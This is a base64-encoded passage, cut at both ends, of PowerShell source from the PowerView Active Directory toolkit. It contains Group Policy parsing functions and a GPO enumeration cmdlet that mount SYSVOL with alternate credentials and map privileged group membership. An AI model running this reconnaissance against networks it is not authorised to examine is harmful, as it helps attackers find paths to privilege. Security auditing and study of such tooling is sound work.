VFxTZWNFZGl0XEdwdFRtcGwuaW5mCmlzIGNvbnN0cnVjdGVkIGFuZCBhc3N1bWVkIHRvIGJlIHRoZSBwYXJzZSB0YXJnZXQuIElmIC1DcmVkZW50aWFsIGlzIHBhc3NlZCwKQWRkLVJlbW90ZUNvbm5lY3Rpb24gaXMgdXNlZCB0byBtb3VudCBcXFRBUkdFVFxTWVNWT0wgd2l0aCB0aGUgc3BlY2lmaWVkIGNyZWRzLAp0aGUgZmlsZXMgYXJlIHBhcnNlZCwgYW5kIHRoZSBjb25uZWN0aW9uIGlzIGRlc3Ryb3llZCBsYXRlciB3aXRoIFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uLgoKLlBBUkFNRVRFUiBHcHRUbXBsUGF0aAoKU3BlY2lmaWVzIHRoZSBHcHRUbXBsLmluZiBmaWxlIHBhdGggbmFtZSB0byBwYXJzZS4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgcmVtb3RlIHN5c3RlbS4KCi5FWEFNUExFCgpHZXQtR3B0VG1wbCAtR3B0VG1wbFBhdGggIlxcZGV2LnRlc3RsYWIubG9jYWxcc3lzdm9sXGRldi50ZXN0bGFiLmxvY2FsXFBvbGljaWVzXHszMUIyRjM0MC0wMTZELTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZiIKClBhcnNlIHRoZSBkZWZhdWx0IGRvbWFpbiBwb2xpY3kgLmluZiBmb3IgZGV2LnRlc3RsYWIubG9jYWwKCi5FWEFNUExFCgpHZXQtRG9tYWluR1BPIHRlc3RpbmcgfCBHZXQtR3B0VG1wbAoKUGFyc2UgdGhlIEdwdFRtcGwuaW5mIHBvbGljeSBmb3IgdGhlIEdQTyB3aXRoIGRpc3BsYXkgbmFtZSBvZiAndGVzdGluZycuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LUdwdFRtcGwgLUNyZWRlbnRpYWwgJENyZWQgLUdwdFRtcGxQYXRoICJcXGRldi50ZXN0bGFiLmxvY2FsXHN5c3ZvbFxkZXYudGVzdGxhYi5sb2NhbFxQb2xpY2llc1x7MzFCMkYzNDAtMDE2RC0xMUQyLTk0NUYtMDBDMDRGQjk4NEY5fVxNQUNISU5FXE1pY3Jvc29mdFxXaW5kb3dzIE5UXFNlY0VkaXRcR3B0VG1wbC5pbmYiCgpQYXJzZSB0aGUgZGVmYXVsdCBkb21haW4gcG9saWN5IC5pbmYgZm9yIGRldi50ZXN0bGFiLmxvY2FsIHVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpIYXNodGFibGUKCk91cHV0cyBhIGhhc2h0YWJsZSByZXByZXNlbnRpbmcgdGhlIHBhcnNlZCBHcHRUbXBsLmluZiBmaWxlLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbSGFzaHRhYmxlXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdncGNmaWxlc3lzcGF0aCcsICdQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR3B0VG1wbFBhdGgsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkTWFwcGVkUGF0aHMgPSBAe30KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoKCRHcHRUbXBsUGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICRTeXNWb2xQYXRoID0gIlxcJCgoTmV3LU9iamVjdCBTeXN0ZW0uVXJpKCRHcHRUbXBsUGF0aCkpLkhvc3QpXFNZU1ZPTCIKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRQYXRoc1skU3lzVm9sUGF0aF0pIHsKICAgICAgICAgICAgICAgICAgICAjIG1hcCBJUEMkIHRvIHRoaXMgY29tcHV0ZXIgaWYgaXQncyBub3QgYWxyZWFkeQogICAgICAgICAgICAgICAgICAgIEFkZC1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRTeXNWb2xQYXRoIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAgICAgJE1hcHBlZFBhdGhzWyRTeXNWb2xQYXRoXSA9ICRUcnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRUYXJnZXRHcHRUbXBsUGF0aCA9ICRHcHRUbXBsUGF0aAogICAgICAgICAgICBpZiAoLW5vdCAkVGFyZ2V0R3B0VG1wbFBhdGguRW5kc1dpdGgoJy5pbmYnKSkgewogICAgICAgICAgICAgICAgJFRhcmdldEdwdFRtcGxQYXRoICs9ICdcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5mJwogICAgICAgICAgICB9CgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUdwdFRtcGxdIFBhcnNpbmcgR3B0VG1wbFBhdGg6ICRUYXJnZXRHcHRUbXBsUGF0aCIKICAgICAgICAgICAgR2V0LUluaUNvbnRlbnQgLVBhdGggJFRhcmdldEdwdFRtcGxQYXRoIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1HcHRUbXBsXSBFcnJvciBwYXJzaW5nICRUYXJnZXRHcHRUbXBsUGF0aCA6ICRfIgogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgICMgcmVtb3ZlIHRoZSBTWVNWT0wgbWFwcGluZ3MKICAgICAgICAkTWFwcGVkUGF0aHMuS2V5cyB8IEZvckVhY2gtT2JqZWN0IHsgUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24gLVBhdGggJF8gfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LUdyb3Vwc1hNTCB7CjwjCi5TWU5PUFNJUwoKSGVscGVyIHRvIHBhcnNlIGEgZ3JvdXBzLnhtbCBmaWxlIHBhdGggaW50byBhIGN1c3RvbSBvYmplY3QuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEFkZC1SZW1vdGVDb25uZWN0aW9uLCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbiwgQ29udmVydFRvLVNJRCAgCgouREVTQ1JJUFRJT04KClBhcnNlcyBhIGdyb3Vwcy54bWwgaW50byBhIGN1c3RvbSBvYmplY3QuIElmIC1DcmVkZW50aWFsIGlzIHBhc3NlZCwKQWRkLVJlbW90ZUNvbm5lY3Rpb24gaXMgdXNlZCB0byBtb3VudCBcXFRBUkdFVFxTWVNWT0wgd2l0aCB0aGUgc3BlY2lmaWVkIGNyZWRzLAp0aGUgZmlsZXMgYXJlIHBhcnNlZCwgYW5kIHRoZSBjb25uZWN0aW9uIGlzIGRlc3Ryb3llZCBsYXRlciB3aXRoIFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uLgoKLlBBUkFNRVRFUiBHcm91cHNYTUxwYXRoCgpTcGVjaWZpZXMgdGhlIGdyb3Vwcy54bWwgZmlsZSBwYXRoIG5hbWUgdG8gcGFyc2UuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0uCgouT1VUUFVUUwoKUG93ZXJWaWV3Lkdyb3Vwc1hNTAojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lkdyb3Vwc1hNTCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3Vwc1hNTFBhdGgsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkTWFwcGVkUGF0aHMgPSBAe30KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoKCRHcm91cHNYTUxQYXRoIC1NYXRjaCAnXFxcXC4qXFwuKicpIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSkgewogICAgICAgICAgICAgICAgJFN5c1ZvbFBhdGggPSAiXFwkKChOZXctT2JqZWN0IFN5c3RlbS5VcmkoJEdyb3Vwc1hNTFBhdGgpKS5Ib3N0KVxTWVNWT0wiCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkTWFwcGVkUGF0aHNbJFN5c1ZvbFBhdGhdKSB7CiAgICAgICAgICAgICAgICAgICAgIyBtYXAgSVBDJCB0byB0aGlzIGNvbXB1dGVyIGlmIGl0J3Mgbm90IGFscmVhZHkKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtUGF0aCAkU3lzVm9sUGF0aCAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICRNYXBwZWRQYXRoc1skU3lzVm9sUGF0aF0gPSAkVHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBbWE1MXSRHcm91cHNYTUxjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJEdyb3Vwc1hNTFBhdGggLUVycm9yQWN0aW9uIFN0b3AKCiAgICAgICAgICAgICMgcHJvY2VzcyBhbGwgZ3JvdXAgcHJvcGVydGllcyBpbiB0aGUgWE1MCiAgICAgICAgICAgICRHcm91cHNYTUxjb250ZW50IHwgU2VsZWN0LVhtbCAiL0dyb3Vwcy9Hcm91cCIgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBub2RlIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgICAgICRHcm91cG5hbWUgPSAkXy5Qcm9wZXJ0aWVzLmdyb3VwTmFtZQoKICAgICAgICAgICAgICAgICMgZXh0cmFjdCB0aGUgbG9jYWxncm91cCBzaWQgZm9yIG1lbWJlcm9mCiAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAkXy5Qcm9wZXJ0aWVzLmdyb3VwU2lkCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkR3JvdXBTSUQpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJEdyb3VwbmFtZSAtbWF0Y2ggJ0FkbWluaXN0cmF0b3JzJykgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ0JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRHcm91cG5hbWUgLW1hdGNoICdSZW1vdGUgRGVza3RvcCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU1NScKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBuYW1lIC1tYXRjaCAnR3Vlc3RzJykgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ2JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSBDb252ZXJ0VG8tU0lEIC1PYmplY3ROYW1lICRHcm91cG5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9IENvbnZlcnRUby1TSUQgLU9iamVjdE5hbWUgJEdyb3VwbmFtZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgZXh0cmFjdCBvdXQgbWVtYmVycyBhZGRlZCB0byB0aGlzIGdyb3VwCiAgICAgICAgICAgICAgICAkTWVtYmVycyA9ICRfLlByb3BlcnRpZXMubWVtYmVycyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IE1lbWJlciB8IFdoZXJlLU9iamVjdCB7ICRfLmFjdGlvbiAtbWF0Y2ggJ0FERCcgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJF8uc2lkKSB7ICRfLnNpZCB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICRfLm5hbWUgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkTWVtYmVycykgewogICAgICAgICAgICAgICAgICAgICMgZXh0cmFjdCBvdXQgYW55L2FsbCBmaWx0ZXJzLi4uSSBoYXRlIHlvdSBHUFAKICAgICAgICAgICAgICAgICAgICBpZiAoJF8uZmlsdGVycykgewogICAgICAgICAgICAgICAgICAgICAgICAkRmlsdGVycyA9ICRfLmZpbHRlcnMuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5IEB7J1R5cGUnID0gJF8uTG9jYWxOYW1lOydWYWx1ZScgPSAkXy5uYW1lfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkRmlsdGVycyA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlcnMgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7ICRNZW1iZXJzID0gQCgkTWVtYmVycykgfQoKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHcm91cHNYTUwgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPUGF0aCcgJFRhcmdldEdyb3Vwc1hNTFBhdGgKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0ZpbHRlcnMnICRGaWx0ZXJzCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwU0lEJyAkR3JvdXBTSUQKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTWVtYmVyT2YnICROdWxsCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlcnMnICRNZW1iZXJzCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR3JvdXBzWE1MJykKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUdyb3Vwc1hNTF0gRXJyb3IgcGFyc2luZyAkVGFyZ2V0R3JvdXBzWE1MUGF0aCA6ICRfIgogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgICMgcmVtb3ZlIHRoZSBTWVNWT0wgbWFwcGluZ3MKICAgICAgICAkTWFwcGVkUGF0aHMuS2V5cyB8IEZvckVhY2gtT2JqZWN0IHsgUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24gLVBhdGggJF8gfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkdQTyB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBHUE9zIG9yIHNwZWNpZmljIEdQTyBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIEdldC1Eb21haW5Db21wdXRlciwgR2V0LURvbWFpblVzZXIsIEdldC1Eb21haW5PVSwgR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUsIEdldC1Eb21haW5TaXRlLCBHZXQtRG9tYWluT2JqZWN0LCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAgCgouREVTQ1JJUFRJT04KCkJ1aWxkcyBhIGRpcmVjdG9yeSBzZWFyY2hlciBvYmplY3QgdXNpbmcgR2V0LURvbWFpblNlYXJjaGVyLCBidWlsZHMgYSBjdXN0b20KTERBUCBmaWx0ZXIgYmFzZWQgb24gdGFyZ2V0aW5nL2ZpbHRlciBwYXJhbWV0ZXJzLCBhbmQgc2VhcmNoZXMgZm9yIGFsbCBvYmplY3RzCm1hdGNoaW5nIHRoZSBjcml0ZXJpYS4gVG8gb25seSByZXR1cm4gc3BlY2lmaWMgcHJvcGVydGllcywgdXNlCiItUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSx1c25jaGFuZ2VkLC4uLiIuIEJ5IGRlZmF1bHQsIGFsbCBHUE8gb2JqZWN0cyBmb3IKdGhlIGN1cnJlbnQgZG9tYWluIGFyZSByZXR1cm5lZC4gVG8gZW51bWVyYXRlIGFsbCBHUE9zIHRoYXQgYXJlIGFwcGxpZWQgdG8KYSBwYXJ0aWN1bGFyIG1hY2hpbmUsIHVzZSAtQ29tcHV0ZXJOYW1lIFguCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIGRpc3BsYXkgbmFtZSAoZS5nLiAnVGVzdCBHUE8nKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gJ0NOPXtGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzJ9LENOPVBvbGljaWVzLENOPVN5c3RlbSxEQz10ZXN0bGFiLERDPWxvY2FsJyksCkdVSUQgKGUuZy4gJzEwZWMzMjBkLTMxMTEtNGVmNC04ZmFmLThmMTRmNGFkYzc4OScpLCBvciBHUE8gbmFtZSAoZS5nLiAne0YyNjBCNzZELTU1QzgtNDZDNS1CRUYxLTkwMTZERDk4RTI3Mn0nKS4gV2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlcklkZW50aXR5CgpSZXR1cm4gYWxsIEdQTyBvYmplY3RzIGFwcGxpZWQgdG8gYSBnaXZlbiBjb21wdXRlciBpZGVudGl0eSAobmFtZSwgZG5zbmFtZSwgRGlzdGluZ3Vpc2hlZE5hbWUsIGV0Yy4pLgoKLlBBUkFNRVRFUiBVc2VySWRlbnRpdHkKClJldHVybiBhbGwgR1BPIG9iamVjdHMgYXBwbGllZCB0byBhIGdpdmVuIHVzZXIgaWRlbnRpdHkgKG5hbWUsIFNJRCwgRGlzdGluZ3Vpc2hlZE5hbWUsIGV0Yy4pLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBGaW5kT25lCgpPbmx5IHJldHVybiBvbmUgcmVzdWx0IG9iamVjdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmF3CgpTd2l0Y2guIFJldHVybiByYXcgcmVzdWx0cyBpbnN0ZWFkIG9mIHRyYW5zbGF0aW5nIHRoZSBmaWVsZHMgaW50byBhIGN1c3RvbSBQU09iamVjdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluR1BPIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKUmV0dXJuIGFsbCBHUE9zIGZvciB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4KCi5FWEFNUExFCgpHZXQtRG9tYWluR1BPIC1Db21wdXRlck5hbWUgd2luZG93czEudGVzdGxhYi5sb2NhbAoKUmV0dXJucyBhbGwgR1BPcyBhcHBsaWVkIHdpbmRvd3MxLnRlc3RsYWIubG9jYWwKCi5FWEFNUExFCgoie0YyNjBCNzZELTU1QzgtNDZDNS1CRUYxLTkwMTZERDk4RTI3Mn0iLCJUZXN0IEdQTyIgfCBHZXQtRG9tYWluR1BPCgpSZXR1cm4gdGhlIEdQT3Mgd2l0aCB0aGUgbmFtZSBvZiAie0YyNjBCNzZELTU1QzgtNDZDNS1CRUYxLTkwMTZERDk4RTI3Mn0iIGFuZCB0aGUgZGlzcGxheQpuYW1lIG9mICJUZXN0IEdQTyIKCi5FWEFNUExFCgpHZXQtRG9tYWluR1BPIC1MREFQRmlsdGVyICcoIXByaW1hcnlncm91cGlkPTUxMyknIC1Qcm9wZXJ0aWVzIHNhbWFjY291bnRuYW1lLGxhc3Rsb2dvbgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5HUE8gLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuR1BPCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIEdQTyBwcm9wZXJ0eSBmaWVsZHMuCgpQb3dlclZpZXcuR1BPLlJhdwoKVGhlIHJhdyBEaXJlY3RvcnlTZXJ2aWNlcy5TZWFyY2hSZXN1bHQgb2JqZWN0LCBpZiAtUmF3IGlzIGVuYWJsZWQuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURlY2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkdQTycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5HUE8uUmF3JyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdOb25lJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJJZGVudGl0eScpXQogICAgICAgIF